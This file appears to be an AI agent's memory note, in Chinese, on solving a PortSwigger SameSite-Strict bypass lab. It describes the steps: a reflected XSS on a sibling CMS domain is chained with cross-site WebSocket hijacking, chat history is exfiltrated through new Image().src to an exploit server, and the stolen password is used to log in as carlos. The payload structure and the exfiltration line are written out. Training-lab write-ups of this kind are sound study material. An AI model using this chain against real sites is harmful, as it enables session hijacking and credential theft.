---
metadata:
  node_type: memory
name: "PRS arm A lab-samesite-strict-bypass-via-sibling-domain"
description: "arm A 基线:lab-samesite-strict-bypass-via-sibling-domain 冷实例一次通过 - 兄弟域 CMS 反射 XSS + CSWSH 窃聊天史得 carlos 口令,banner solved"
last_updated: 2026-10-09T07:53:06+08:00
created: 2026-10-09T07:53:06+08:00
---

## 2026-10-08 arm A 基线 @lab-samesite-strict-bypass-via-sibling-domain

- 实例:`range_launch launch-url /web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain --jar /tmp/cj1.json` → `https://0a900064042fcb39801312cf005a004b.web-security-academy.net/`,reused:false,一次通过。
- 题面(仅 page_read 题面,未读题解):live chat 有 CSWSH,目标=登录受害者账号;聊天史含明文口令;须经 exploit server 交付并把聊天史外传给 Collaborator 类信道。
- 关键链路(全部走件):
  1. `http_dump /resources/js/chat.js` 的响应头 `access-control-allow-origin: https://cms-0a900064042fcb39801312cf005a004b.web-security-academy.net` —— 兄弟域由此暴露(页面本身无引用)。
  2. 兄弟域 CMS 根 302 → /login;POST /login 用错误口令时响应体 `<p>Invalid username: <原样反射></p>` 未转义 = 同站脚本执行面。
  3. exploit server 存页:JS 造表单自动 POST 到 `https://cms-<lab>/login`,username 值为 `<scr'+'ipt>` 拼接的载荷;载荷开 `wss://<lab>/chat`,onopen 发 `"READY"`,onmessage 用 `new Image().src='https://exploit-.../exfil?d='+encodeURIComponent(e.data)` 外传。
  4. 同站条件:`cms-<lab>` 与 `<lab>` 同属 web-security-academy.net,故 WS 握手带上 `SameSite=Strict` 的 session cookie —— 这就是"经兄弟域绕过 SameSite"的实质。
  5. DELIVER_TO_VICTIM(带 --follow,302 → /deliver-to-victim → /),nap 12s 后 `GET /log` 读到 5 条 /exfil。
- 窃得:`{"user":"Hal Pline","content":"No problem carlos, it's 5qf82rmzahzocb6dfpqz"}` → carlos / 5qf82rmzahzocb6dfpqz。
- 收口:POST /login(username=carlos + 已抓 csrf)→ 302 /my-account?id=carlos("Your username is: carlos")→ `banner_verdict` solved:true + `<h4>Congratulations, you solved the lab!</h4>`。
- 两个坑:① launch 信封 `exploit_server:null`,exploit server 地址只在实例页 HTML 的 `#exploit-link` 里;② 主站登录要 csrf,而 `http_session submitform` 对 `action="/login"` 相对路径报 "relative URL without a base"(该件无 --base),改为先 GET /login 抓 csrf 再直接 POST。
- 件面:range_launch / http_dump / http_session / text_grep / nap / banner_verdict 足够,无需新件。

